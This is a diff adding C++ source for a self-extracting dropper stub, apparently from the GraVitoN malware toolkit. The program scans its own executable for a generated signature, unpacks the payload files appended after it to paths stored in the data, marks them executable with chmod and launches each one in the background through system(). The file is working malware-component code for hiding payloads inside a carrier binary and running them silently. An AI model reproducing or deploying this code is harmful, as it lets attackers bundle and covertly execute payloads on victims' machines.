@@ -1,0 +1,178 @@
+// #define WINDOWS
+// #define LINUX
+// #define MACOSX
+
+/// Activate/Deactivate GraVitoN logger
+#define GVN_ACTIVATE_LOGGER
+
+#include "../../../../gvn_utils/gvn_files.hpp"
+#include <sys/types.h>
+#include <unistd.h>
+#include <iostream>
+#include <cassert>
+#include <vector>
+
+using namespace std;
+using namespace GraVitoN;
+
+typedef unsigned long UInt64;
+
+int SPREAD_ENDOFFILE_EOF_SIGNATURE_SIZE = 256;
+unsigned char *SPREAD_ENDOFFILE_EOF_SIGNATURE;
+
+void generateSignature()
+{
+        SPREAD_ENDOFFILE_EOF_SIGNATURE = new unsigned char[SPREAD_ENDOFFILE_EOF_SIGNATURE_SIZE];
+	unsigned char sig = 0xCE;
+        for(int i=0; i<SPREAD_ENDOFFILE_EOF_SIGNATURE_SIZE; ++i)
+	{
+		//printf("%.2x\n", sig);
+                SPREAD_ENDOFFILE_EOF_SIGNATURE[i] = sig;
+		
+		/// 79 is a prime number!
+		sig = (~sig % 79 + (sig << 8) % 79 + (sig >> 8) % 79) % 0xFF;
+	}
+}
+
+UInt64 getSignaturePos(const char unsigned *buff, const UInt64 &size)
+{
+	UInt64 spos = 0, i = 0;
+	for(i=0; i<size; ++i)
+	{
+                if( buff[i] == SPREAD_ENDOFFILE_EOF_SIGNATURE[spos] )
+		{
+			++spos;
+			Logger::logItLn(spos);
+                        if( spos == SPREAD_ENDOFFILE_EOF_SIGNATURE_SIZE )
+			{
+				Logger::logItLn(i);	
+                                return i - SPREAD_ENDOFFILE_EOF_SIGNATURE_SIZE;
+			}
+		}
+		else
+		{
+			spos = 0;
+		}
+	}
+	
+	return size;
+}
+
+void runDetachedProcess(const string &exe_path)
+{
+	const string chmod("chmod u+xrw ");
+	system((chmod + exe_path).c_str());
+	if(exe_path[0] == '/' )
+		system((exe_path + " &").c_str());
+	else
+		system(("./" + exe_path + " &").c_str());
+}
+
+int main(int argc, char *argv[])
+{
+	generateSignature();
+	
+	unsigned char *buff = NULL;
+	UInt64 buff_size, spos;
+	
+	buff_size = File::loadFile(argv[0], &buff);
+	//buff_size = File::loadFile("payload.exe", &buff);
+	
+        spos = getSignaturePos(buff, buff_size) + SPREAD_ENDOFFILE_EOF_SIGNATURE_SIZE + 1;
+	//printf("%lu < %lu\n", spos, buff_size);
+	assert(spos < buff_size);
+	
+	int number_of_files = 0;
+	memcpy(&number_of_files, &buff[spos], 2);
+	spos += 2;
+	assert(spos < buff_size);
+	
+	//printf("Num: %d\n", number_of_files);
+		
+	vector<string> full_path;
+	vector<bool>   is_executable;
+
+	int i;
+	for(i=0; i<number_of_files; ++i)
+	{
+		char *filename;
+		char *extraction_path;
+		unsigned char *file_contents;
+	
+		int file_size = 0;
+		unsigned long filename_size = 0;
+		int extraction_path_size = 0;
+	
+
+		UInt64 sz = 0;
+		/// Read size of file name: 2 bytes
+		filename_size = 0;
+		memcpy(&filename_size, &buff[spos], 2);
+		spos += 2;
+		assert(spos < buff_size);
+		filename = new char [filename_size + 1];
+		//printf("NSize: %d, spos: %lu\n", filename_size, spos);
+		
+		/// Read filename
+		sz = filename_size * sizeof(char);
+		memcpy(filename, &buff[spos], sz);
+		filename[filename_size] = '\0';
+		//printf("Name: '%s'\n", filename);
+		spos += sz; 
+		assert(spos < buff_size);
+		
+		/// Read size of extraction path: 2 bytes
+		extraction_path_size = 0;
+		memcpy(&extraction_path_size, &buff[spos], 2);
+		spos += 2; 
+		assert(spos < buff_size);
+		extraction_path = new char [extraction_path_size + 1];
+		//printf("XSize: %d, spos: %lu\n", extraction_path_size, spos);
+		
+		/// Read extraction path
+		sz = extraction_path_size * sizeof(char);
+		memcpy(extraction_path, &buff[spos], sz);
+		extraction_path[extraction_path_size] = '\0';
+		//printf("Extp: '%s'\n", extraction_path);
+		spos += sz; 
+		assert(spos < buff_size);
+		
+		/// Execute after extraction (Flag): 1 byte
+		sz = 1;
+		int isExec = 0;
+		memcpy(&isExec, &buff[spos], sz);
+		is_executable.push_back( (isExec)?true:false );
+		spos += sz; 
+		assert(spos < buff_size);
+		
+		/// Read Size of File: 4 bytes
+		file_size = 0;
+		memcpy(&file_size, &buff[spos], 4); 
+		spos += 4; 
+		assert(spos < buff_size);
+		//printf("FSize: %lu, spos: %lu\n", file_size, spos);
+		
+		/// Read file content
+		sz = file_size * sizeof(unsigned char);
+		//printf("Loading file (%lu) ...\n", sz);
+		file_contents = new unsigned char[file_size];
+		memcpy(file_contents, &buff[spos], sz);
+		spos += sz;
+		assert(spos <= buff_size);
+		
+		/// Extract file
+		full_path.push_back(extraction_path);
+		full_path[i] = full_path[i] + string(filename);
+		File::saveUChars(full_path[i], file_contents, file_size);
+
+		/// Free memory
+		delete file_contents;
+		delete filename;
+		delete extraction_path;
+	}
+	
+	for(vector<string>::iterator ivs = full_path.begin(); ivs != full_path.end(); ++ivs)
+		runDetachedProcess(*ivs);
+
+	return 0;
+}
